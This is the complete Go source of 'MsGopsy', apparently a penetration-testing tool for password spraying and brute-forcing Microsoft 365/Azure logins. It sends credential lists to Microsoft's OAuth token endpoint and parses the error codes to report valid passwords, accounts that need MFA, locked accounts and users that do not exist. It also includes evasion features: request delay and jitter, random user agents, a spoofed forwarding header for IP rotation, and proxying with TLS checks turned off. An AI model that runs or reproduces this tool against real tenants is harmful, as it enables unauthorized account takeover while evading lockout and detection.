package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	neturl "net/url" // Use an alias to avoid shadowing with net/http
	"os"
	"os/signal"
	"path/filepath"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

type Result struct {
	Username string `json:"username"`
	Password string `json:"password"`
	Status   string `json:"status"`
	MFA      bool   `json:"mfa"`
	Message  string `json:"message"`
}

type SprayConfig struct {
	Usernames []string
	Passwords []string
	URL       string
	Threads   int
}

func sprayWorker(ctx context.Context, cfg SprayConfig, jobs <-chan [2]string, wg *sync.WaitGroup, results *[]Result, mu *sync.Mutex, verbose bool, noColor bool, logChan chan<- string, progressChan chan<- int, onlySuccess bool, onlySuccessNoMFA bool, client *http.Client, delayMs int, jitterMs int, printMu *sync.Mutex, progressState *progressInfo, uaProvider func() string, xfwd bool) {
	// ANSI color codes
	colorReset := ""
	colorGreen := ""
	colorYellow := ""
	colorRed := ""
	colorBlue := ""
	colorCyan := ""
	colorMagenta := ""
	colorGrey := ""
	colorBlack := ""
	colorBrown := ""
	if !noColor {
		colorReset = "\033[0m"
		colorGreen = "\033[32m"
		colorYellow = "\033[33m"
		colorRed = "\033[31m"
		colorBlue = "\033[34m"
		colorCyan = "\033[36m"
		colorMagenta = "\033[35m"
		colorGrey = "\033[90m"
		colorBlack = "\033[30m"
		colorBrown = "\033[38;5;94m"
	}

	defer wg.Done()
	for pair := range jobs {
		select {
		case <-ctx.Done():
			return
		default:
		}
		// Rate limiting
		if delayMs > 0 {
			totalDelay := delayMs
			if jitterMs > 0 {
				totalDelay += rand.Intn(jitterMs + 1)
			}
			time.Sleep(time.Duration(totalDelay) * time.Millisecond)
		}
		username := pair[0]
		password := pair[1]
		status, mfa, msg := tryLogin(ctx, client, username, password, cfg.URL, uaProvider, xfwd)
		mu.Lock()
		// Store only selected results if filters active, else all
		store := true
		if onlySuccessNoMFA {
			store = (status == "success" && !mfa)
		} else if onlySuccess {
			store = (status == "success" || status == "mfa" || status == "duo_mfa")
		}
		if store {
			*results = append(*results, Result{Username: username, Password: password, Status: status, MFA: mfa, Message: msg})
		}
		mu.Unlock()

		var out string
		show := true
		switch status {
		case "success":
			out = fmt.Sprintf("%s[SUCCESS]%s %s : %s | %s", colorGreen, colorReset, username, password, msg)
			if onlySuccessNoMFA && mfa {
				show = false
			}
		case "mfa":
			out = fmt.Sprintf("%s[SUCCESS-MFA]%s %s : %s | %s", colorYellow, colorReset, username, password, msg)
			if onlySuccessNoMFA {
				show = false
			}
		case "duo_mfa":
			out = fmt.Sprintf("%s[DUO-MFA]%s %s : %s | %s", colorCyan, colorReset, username, password, msg)
			if !(onlySuccess || onlySuccessNoMFA) {
				show = false
			} // treat duo_mfa as success variant for --only-success
		case "expired":
			out = fmt.Sprintf("%s[EXPIRED]%s %s : %s | %s", colorBlue, colorReset, username, password, msg)
			show = !onlySuccess && !onlySuccessNoMFA
		case "invalid_tenant":
			out = fmt.Sprintf("%s[INVALID TENANT]%s %s : %s | %s", colorMagenta, colorReset, username, password, msg)
			show = !onlySuccess && !onlySuccessNoMFA
		case "invalid_user":
			out = fmt.Sprintf("%s[INVALID USER]%s %s : %s | %s", colorBrown, colorReset, username, password, msg)
			show = !onlySuccess && !onlySuccessNoMFA
		case "locked":
			out = fmt.Sprintf("%s[LOCKED]%s %s : %s | %s", colorGrey, colorReset, username, password, msg)
			show = !onlySuccess && !onlySuccessNoMFA
		case "disabled":
			out = fmt.Sprintf("%s[DISABLED]%s %s : %s | %s", colorBlack, colorReset, username, password, msg)
			show = !onlySuccess && !onlySuccessNoMFA
		case "invalid_password":
			if verbose && !onlySuccess && !onlySuccessNoMFA {
				out = fmt.Sprintf("%s[INVALID PASSWORD]%s %s : %s | %s", colorRed, colorReset, username, password, msg)
			} else {
				show = false
			}
		case "unknown":
			out = fmt.Sprintf("[UNKNOWN ERROR] %s : %s | %s", username, password, msg)
			show = !onlySuccess && !onlySuccessNoMFA
		case "error":
			out = fmt.Sprintf("%s[ERROR]%s %s : %s | %s", colorRed, colorReset, username, password, msg)
			show = true
		}
		if show && out != "" {
			if printMu != nil {
				printMu.Lock()
			}
			// Clear progress line before printing message
			if progressState != nil && atomic.LoadInt64(&progressState.total) > 1 {
				fmt.Printf("\r%*s\r", progressState.lastLineLen, "")
			}
			fmt.Println(out)
			if logChan != nil {
				logChan <- removeANSICodes(out)
			}
			if printMu != nil {
				printMu.Unlock()
			}
		}
		if progressChan != nil {
			progressChan <- 1
		}
	}
}

// Remove ANSI color codes for log file
func removeANSICodes(s string) string {
	var out []rune
	inSeq := false
	for _, r := range s {
		if r == '\033' {
			inSeq = true
			continue
		}
		if inSeq {
			if (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') {
				inSeq = false
			}
			continue
		}
		out = append(out, r)
	}
	return string(out)
}

func tryLogin(ctx context.Context, client *http.Client, username, password, url string, uaProvider func() string, xfwd bool) (string, bool, string) {
	data := []byte(fmt.Sprintf("resource=https://graph.windows.net&client_id=1b730954-1685-4b74-9bfd-dac224a7b894&client_info=1&grant_type=password&username=%s&password=%s&scope=openid", username, password))
	req, err := http.NewRequestWithContext(ctx, "POST", url+"/common/oauth2/token", bytes.NewBuffer(data))
	if err != nil {
		return "error", false, err.Error()
	}
	req.Header.Set("Accept", "application/json")
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	if uaProvider != nil {
		req.Header.Set("User-Agent", uaProvider())
	} else {
		req.Header.Set("User-Agent", "MsGopsy/1.0")
	}
	if xfwd {
		//req.Header.Set("X-Forwarded-For", xfwd)
		req.Header.Set("X-My-X-Forwarded-For", "127.0.0.1")
	}

	resp, err := client.Do(req)
	if err != nil {
		return "error", false, err.Error()
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)

	if resp.StatusCode == 200 {
		return "success", false, "Valid credentials"
	}
	// Check for MFA and other statuses
	if bytes.Contains(body, []byte("AADSTS50079")) || bytes.Contains(body, []byte("AADSTS50076")) {
		return "mfa", true, "MFA required"
	}
	if bytes.Contains(body, []byte("AADSTS50158")) {
		return "duo_mfa", true, "Conditional Access (DUO or other MFA)"
	}
	if bytes.Contains(body, []byte("AADSTS50126")) {
		return "invalid_password", false, "Invalid password"
	}
	if bytes.Contains(body, []byte("AADSTS50128")) || bytes.Contains(body, []byte("AADSTS50059")) {
		return "invalid_tenant", false, "Tenant does not exist"
	}
	if bytes.Contains(body, []byte("AADSTS50034")) {
		return "invalid_user", false, "User does not exist"
	}
	if bytes.Contains(body, []byte("AADSTS50053")) {
		return "locked", false, "Account locked"
	}
	if bytes.Contains(body, []byte("AADSTS50057")) {
		return "disabled", false, "Account disabled"
	}
	if bytes.Contains(body, []byte("AADSTS50055")) {
		return "expired", false, "Password expired"
	}
	// Attempt to parse JSON error for clearer message
	var parsed map[string]interface{}
	if err := json.Unmarshal(body, &parsed); err == nil {
		if desc, ok := parsed["error_description"].(string); ok {
			return "unknown", false, desc
		}
	}
	return "unknown", false, string(body)
}

// progressInfo tracks progress printing state
type progressInfo struct {
	total       int64
	completed   int64
	lastLineLen int
}

func main() {
	// Context cancellation (Ctrl+C)
	ctx, cancel := context.WithCancel(context.Background())
	sigs := make(chan os.Signal, 1)
	signal.Notify(sigs, os.Interrupt, syscall.SIGTERM)
	interrupted := make(chan struct{})
	go func() {
		<-sigs
		fmt.Println("\n[!] Interrupt received, finishing in-flight requests (Ctrl+C again to force)")
		cancel()
		close(interrupted)
		// Second signal forces exit
		<-sigs
		fmt.Println("\n[!] Force exit")
		os.Exit(1)
	}()
	// Custom help
	flag.Usage = func() {
		fmt.Fprintln(os.Stderr, "\nMsGopsy: Multi-threaded O365/Azure password spray tool")
		fmt.Fprintln(os.Stderr, "Usage examples:")
		fmt.Fprintln(os.Stderr, "  - Single user, single password:   -u user@domain.com -p Winter2025!")
		fmt.Fprintln(os.Stderr, "  - Single user, password list:   -u user@domain.com -P passwords.txt")
		fmt.Fprintln(os.Stderr, "  - User list, single password:   -U users.txt -p Winter2025!")
		fmt.Fprintln(os.Stderr, "  - User list, password list:     -U users.txt -P passwords.txt")
		fmt.Fprintln(os.Stderr, "Flags:")
		fmt.Fprintln(os.Stderr, "  -u, --username            Single username (user@domain.com)")
		fmt.Fprintln(os.Stderr, "  -U, --username-list       File with usernames, one per line")
		fmt.Fprintln(os.Stderr, "  -p, --password            Single password")
		fmt.Fprintln(os.Stderr, "  -P, --password-list       File with passwords, one per line")
		fmt.Fprintln(os.Stderr, "  -pl, --pair-list         File with username:password pairs, one per line (credential pair mode)")
		fmt.Fprintln(os.Stderr, "  -url                      URL to spray against (default: https://login.microsoft.com)")
		fmt.Fprintln(os.Stderr, "  -threads                  Number of concurrent threads (default: 5)")
		fmt.Fprintln(os.Stderr, "  -o, --output [dir]       Output file for successful results (JSON). If a directory or '.' is specified, saves as YYYY-MM-DD_HH-MM-SS_MsGopsy.json in that location.")
		fmt.Fprintln(os.Stderr, "  -no-color                 Disable color output")
		fmt.Fprintln(os.Stderr, "  -l, --log [dir]           Save raw log to file (optionally specify directory, default current directory)")
		fmt.Fprintln(os.Stderr, "  -v                        Verbose: include invalid password lines")
		fmt.Fprintln(os.Stderr, "  -only-success            Show only successful results (including MFA & conditional access)")
		fmt.Fprintln(os.Stderr, "  -only-success-nomfa      Show only successful results (no MFA)")
		fmt.Fprintln(os.Stderr, "  -delay-ms N              Base delay in milliseconds between attempts (rate limiting)")
		fmt.Fprintln(os.Stderr, "  -jitter-ms N             Add random 0..N ms jitter to each delay")
		fmt.Fprintln(os.Stderr, "  -user-agent UA           Set a custom User-Agent header")
		fmt.Fprintln(os.Stderr, "  -user-agent-random       Use a random common User-Agent each request")
		fmt.Fprintln(os.Stderr, "  -proxy ip:port           Route requests through HTTP proxy (e.g., 127.0.0.1:8080 for Burp)")
		fmt.Fprintln(os.Stderr, "  -x-forwarded-for         Set X-Forwarded-For header as 127.0.0.1 (Used for FireProx)")
		fmt.Fprintln(os.Stderr, "  -h, --help                Show this help menu")
	}

	// Flags
	username := flag.String("u", "", "Single username (user@domain.com)")
	usernameList := flag.String("U", "", "File with usernames, one per line")
	password := flag.String("p", "", "Single password")
	passwordList := flag.String("P", "", "File with passwords, one per line")
	pairList := flag.String("pl", "", "File with username:password pairs, one per line")
	url := flag.String("url", "https://login.microsoft.com", "URL to spray against")
	threads := flag.Int("threads", 5, "Number of concurrent threads")
	output := flag.String("o", "", "Output file for successful results (JSON)")
	verbose := flag.Bool("v", false, "Verbose: show invalid password attempts as well as successes")
	noColor := flag.Bool("no-color", false, "Disable color output")
	saveLog := flag.String("l", "", "Save raw log to file (optionally specify directory)")
	onlySuccess := flag.Bool("only-success", false, "Show only successful results (including MFA)")
	onlySuccessNoMFA := flag.Bool("only-success-nomfa", false, "Show only successful results (no MFA)")
	delayMs := flag.Int("delay-ms", 0, "Delay in ms between attempts")
	jitterMs := flag.Int("jitter-ms", 0, "Random jitter 0..N ms added to delay")
	userAgent := flag.String("user-agent", "", "Custom User-Agent header")
	userAgentRandom := flag.Bool("user-agent-random", false, "Use random common User-Agent each request")
	xfwdHeader := flag.Bool("x-forwarded-for", false, "Set X-Forwarded-For header as 127.0.0.1 (Used for FireProx)")
	proxyAddr := flag.String("proxy", "", "Route requests through HTTP proxy (ip:port, e.g., 127.0.0.1:8080)")
	// Support long flags
	flag.StringVar(username, "username", "", "Single username (user@domain.com)")
	flag.StringVar(usernameList, "username-list", "", "File with usernames, one per line")
	flag.StringVar(password, "password", "", "Single password")
	flag.StringVar(passwordList, "password-list", "", "File with passwords, one per line")
	flag.StringVar(pairList, "pair-list", "", "File with username:password pairs, one per line")
	flag.StringVar(output, "output", "", "Output file for successful results (JSON)")
	flag.StringVar(saveLog, "log", "", "Save raw log to file (optionally specify directory)")

	flag.Parse()

	// Validate conflicting flags
	if *onlySuccess && *onlySuccessNoMFA {
		fmt.Println("Cannot use --only-success and --only-success-nomfa together.")
		os.Exit(1)
	}
	if *userAgentRandom && *userAgent != "" {
		fmt.Println("Cannot use --user-agent and --user-agent-random together.")
		os.Exit(1)
	}

	// Input validation and loading
	var usernames, passwords []string
	var pairs [][2]string
	pairMode := false

	if *pairList != "" {
		// Ensure no other user/pass flags used
		if *username != "" || *usernameList != "" || *password != "" || *passwordList != "" {
			fmt.Println("--pair-list cannot be combined with -u/-U/-p/-P")
			os.Exit(1)
		}
		// Credential pair mode
		pairMode = true
		f, err := os.Open(*pairList)
		if err != nil {
			fmt.Printf("Failed to open pair list: %v\n", err)
			os.Exit(1)
		}
		defer f.Close()
		scanner := bufio.NewScanner(f)
		for scanner.Scan() {
			line := strings.TrimSpace(scanner.Text())
			if after, ok := strings.CutPrefix(line, "\uFEFF"); ok {
				line = after
			} // BOM
			if line == "" || strings.HasPrefix(line, "#") {
				continue
			}
			parts := strings.SplitN(line, ":", 2)
			if len(parts) != 2 {
				fmt.Printf("Invalid pair line: %s\n", line)
				os.Exit(1)
			}
			pairs = append(pairs, [2]string{parts[0], parts[1]})
		}
		if err := scanner.Err(); err != nil {
			fmt.Printf("Failed to read pair list: %v\n", err)
			os.Exit(1)
		}
		if len(pairs) == 0 {
			fmt.Println("Pair list is empty.")
			os.Exit(1)
		}
	} else {
		// Username(s)
		if *username != "" && *usernameList != "" {
			fmt.Println("Cannot use both -u/--username and -U/--username-list.")
			os.Exit(1)
		}
		if *username != "" {
			usernames = []string{*username}
		} else if *usernameList != "" {
			f, err := os.Open(*usernameList)
			if err != nil {
				fmt.Printf("Failed to open username list: %v\n", err)
				os.Exit(1)
			}
			defer f.Close()
			scanner := bufio.NewScanner(f)
			for scanner.Scan() {
				u := strings.TrimSpace(scanner.Text())
				if after, ok := strings.CutPrefix(u, "\uFEFF"); ok {
					u = after
				}
				if u == "" || strings.HasPrefix(u, "#") {
					continue
				}
				if u != "" {
					usernames = append(usernames, u)
				}
			}
			if err := scanner.Err(); err != nil {
				fmt.Printf("Failed to read username list: %v\n", err)
				os.Exit(1)
			}
		}

		// Password(s)
		if *password != "" && *passwordList != "" {
			fmt.Println("Cannot use both -p/--password and -P/--password-list.")
			os.Exit(1)
		}
		if *password != "" {
			passwords = []string{*password}
		} else if *passwordList != "" {
			f, err := os.Open(*passwordList)
			if err != nil {
				fmt.Printf("Failed to open password list: %v\n", err)
				os.Exit(1)
			}
			defer f.Close()
			scanner := bufio.NewScanner(f)
			for scanner.Scan() {
				p := strings.TrimSpace(scanner.Text())
				if after, ok := strings.CutPrefix(p, "\uFEFF"); ok {
					p = after
				}
				if p == "" || strings.HasPrefix(p, "#") {
					continue
				}
				if p != "" {
					passwords = append(passwords, p)
				}
			}
			if err := scanner.Err(); err != nil {
				fmt.Printf("Failed to read password list: %v\n", err)
				os.Exit(1)
			}
		}

		// Validate input combinations
		if len(usernames) == 0 || len(passwords) == 0 {
			fmt.Println("You must provide at least one username and one password. See -h for help.")
			os.Exit(1)
		}

		// If both lists are provided, lengths must match
		if len(usernames) > 1 && len(passwords) > 1 {
			if len(usernames) != len(passwords) {
				fmt.Println("If using both a username list and a password list, they must have the same number of lines.")
				os.Exit(1)
			}
		}
	}

	cfg := SprayConfig{
		Usernames: usernames,
		Passwords: passwords,
		URL:       *url,
		Threads:   *threads,
	}

	// Timestamp
	fmt.Printf("[%s] Starting MsGopsy\n", time.Now().Format("2006-01-02 15:04:05"))

	// Mode message
	var totalJobs int
	if pairMode {
		fmt.Printf("[MODE] Credential pair mode (username:password)\n")
		totalJobs = len(pairs)
	} else if len(usernames) == 1 && len(passwords) == 1 {
		fmt.Printf("[MODE] Single credential check: %s : %s\n", usernames[0], passwords[0])
		totalJobs = 1
	} else if len(usernames) == 1 && len(passwords) > 1 {
		fmt.Printf("[MODE] Brute-forcing username: %s\n", usernames[0])
		totalJobs = len(passwords)
	} else if len(usernames) > 1 && len(passwords) == 1 {
		fmt.Printf("[MODE] Password-spraying: %s\n", passwords[0])
		totalJobs = len(usernames)
	} else if len(usernames) == len(passwords) {
		fmt.Printf("[MODE] Multiple credential check (userN:passN)\n")
		totalJobs = len(usernames)
	}

	jobs := make(chan [2]string, 100)
	results := []Result{}
	var mu sync.Mutex
	var wg sync.WaitGroup

	// Progress indicator (thread-safe)
	var progressChan chan int
	var pInfo *progressInfo
	var printMu sync.Mutex
	if totalJobs > 1 {
		progressChan = make(chan int, 100)
		pInfo = &progressInfo{total: int64(totalJobs)}
		go func() {
			for range progressChan {
				atomic.AddInt64(&pInfo.completed, 1)
				percent := float64(atomic.LoadInt64(&pInfo.completed)) / float64(pInfo.total) * 100
				line := fmt.Sprintf("Progress: %d/%d (%.1f%%)", atomic.LoadInt64(&pInfo.completed), pInfo.total, percent)
				pInfo.lastLineLen = len(line)
				printMu.Lock()
				fmt.Printf("\r%s", line)
				printMu.Unlock()
			}
			printMu.Lock()
			fmt.Print("\n")
			printMu.Unlock()
		}()
	}

	// Prepare log file if needed
	var logChan chan string
	var logFile *os.File
	if *saveLog != "" {
		logChan = make(chan string, 100)
		now := time.Now().Format("2006-01-02_15-04-05")
		logName := fmt.Sprintf("%s_MsGopsy.log", now)
		logPath := *saveLog
		if logPath == "." || logPath == "./" || logPath == "" {
			logPath = logName
		} else {
			fi, err := os.Stat(logPath)
			if err == nil && fi.IsDir() {
				logPath = filepath.Join(logPath, logName)
			}
		}
		f, err := os.Create(logPath)
		if err != nil {
			fmt.Printf("Failed to create log file: %v\n", err)
			os.Exit(1)
		}
		logFile = f
		defer logFile.Close()
		var logWg sync.WaitGroup
		logWg.Add(1)
		go func() {
			defer logWg.Done()
			for line := range logChan {
				logFile.WriteString(line + "\n")
			}
		}()
		defer func() { close(logChan); logWg.Wait() }()
	}

	// Reusable HTTP client with optional proxy
	var httpClient *http.Client
	if *proxyAddr != "" {
		proxyURL := fmt.Sprintf("http://%s", *proxyAddr)
		proxyFunc := func(_ *http.Request) (*neturl.URL, error) {
			return neturl.Parse(proxyURL)
		}
		transport := &http.Transport{Proxy: proxyFunc, TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
		httpClient = &http.Client{Timeout: 15 * time.Second, Transport: transport}
	} else {
		httpClient = &http.Client{Timeout: 15 * time.Second}
	}

	// User-Agent provider
	commonAgents := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15",
		"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Mobile Safari/537.36",
	}
	var uaProvider func() string
	switch {
	case *userAgentRandom:
		uaProvider = func() string { return commonAgents[rand.Intn(len(commonAgents))] }
	case *userAgent != "":
		fixed := *userAgent
		uaProvider = func() string { return fixed }
	default:
		uaProvider = func() string { return "MsGopsy/1.0" }
	}

	// Start workers
	for i := 0; i < cfg.Threads; i++ {
		wg.Add(1)
		go sprayWorker(ctx, cfg, jobs, &wg, &results, &mu, *verbose, *noColor, logChan, progressChan, *onlySuccess, *onlySuccessNoMFA, httpClient, *delayMs, *jitterMs, &printMu, pInfo, uaProvider, *xfwdHeader)
	}

	// Enqueue jobs
	if pairMode {
		for _, pair := range pairs {
			jobs <- pair
		}
	} else if len(usernames) == 1 && len(passwords) > 1 {
		// Single user, many passwords
		for _, pw := range passwords {
			jobs <- [2]string{usernames[0], pw}
		}
	} else if len(passwords) == 1 && len(usernames) > 1 {
		// Single password, many users
		for _, u := range usernames {
			jobs <- [2]string{u, passwords[0]}
		}
	} else if len(usernames) == len(passwords) {
		// List mode: user1-pass1, user2-pass2, ...
		for i := 0; i < len(usernames); i++ {
			jobs <- [2]string{usernames[i], passwords[i]}
		}
	} else if len(usernames) == 1 && len(passwords) == 1 {
		jobs <- [2]string{usernames[0], passwords[0]}
	} else {
		// Should not reach here due to earlier validation
		fmt.Println("Invalid input combination.")
		os.Exit(1)
	}
	close(jobs)
	wg.Wait()
	if progressChan != nil {
		close(progressChan)
	}

	// Summary stats
	stats := map[string]int{}
	for _, r := range results {
		stats[r.Status]++
	}
	fmt.Println("\nSummary:")
	keys := []string{"success", "mfa", "duo_mfa", "expired", "invalid_tenant", "invalid_user", "locked", "disabled", "invalid_password", "unknown", "error"}
	total := 0
	for _, k := range keys {
		total += stats[k]
	}
	for _, k := range keys {
		if stats[k] > 0 {
			fmt.Printf("  %-16s %d\n", k, stats[k])
		}
	}
	fmt.Printf("  %-16s %d\n", "total(stored)", len(results))
	if *onlySuccess || *onlySuccessNoMFA {
		fmt.Println("  (Filtered storage enabled)")
	}

	// Output
	if *output != "" {
		jsonData, _ := json.MarshalIndent(results, "", "  ")
		now := time.Now().Format("2006-01-02_15-04-05")
		outName := fmt.Sprintf("%s_MsGopsy.json", now)
		outPath := *output
		if outPath == "." || outPath == "./" || outPath == "" {
			outPath = outName
		} else {
			fi, err := os.Stat(outPath)
			if err == nil && fi.IsDir() {
				outPath = filepath.Join(outPath, outName)
			}
		}
		os.WriteFile(outPath, jsonData, 0644)
		fmt.Printf("Results written to %s\n", outPath)
	}

	// If interrupted, exit with code 130 (Ctrl+C)
	select {
	case <-interrupted:
		os.Exit(130)
	default:
	}
}
